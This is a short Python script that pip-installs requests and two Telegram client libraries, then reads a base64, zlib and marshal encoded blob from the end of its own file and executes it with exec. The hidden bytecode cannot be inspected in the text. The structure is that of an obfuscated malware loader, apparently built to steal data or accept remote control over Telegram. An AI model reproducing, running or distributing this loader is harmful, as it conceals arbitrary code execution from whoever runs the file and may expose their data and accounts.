import subprocess
import sys
import base64
import zlib
import marshal

subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"])
subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"])

with open(__file__, "r", encoding="utf-8") as f:
    data = f.read()
secure_data = data.split("# DATA")[1].strip()
payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
exec(payload)

# DATA
eJxLZkACbFD68x4gMZ0hhSGFMYchlzGKkRHEZsphimJKYY5iZmJIZUxlXsOymhGiPIollSWLiwEDZPFgikWxA3VzpLKnsK5mgoiYMkRxAvWLYqpNYUvlXMMOUwd0AxMIIviVTMoMhgzFjOVMjAyRQD5IpII5kqGcUZPjJUiJJuMtZqf8Er8qPXMLcyMDE1MLQxMrR0f3+OKw7EhX4/AQS4ug8iTzxDLdVJeIKKNEY5/SvEhHl0CgPtaS/OzUvFtMRUm3uMyMLAyMzCwsDEw0mW6xJ2cklsRnptziSMlPLs1NzSvR5L7FUZKak5pelJhbBHLcLab84lucSfkl8RBDmIHMW+zFqcXFmfl5tzjSMnNS8xJzU2/xQIXiQSK3WPILgGoZ027xFqfmpcTDTF/J8BnklV8cNsUlRZl56Xa3OGxy81NKc1LtikTBwcDAUBwCJD4wMzIyPmWQuM3A+YDHpoHzJhvnBM4rbFINzDf4hfqrO6uv8ytf5Fdu4LnJytmhM4PlCqvsAsEbLOzXWUQvsojOyNkQeIFF9AqL+XdmBja566yyF1llfxVzAw3eKuIoxHxQiNVRmh0AbD2HKg==
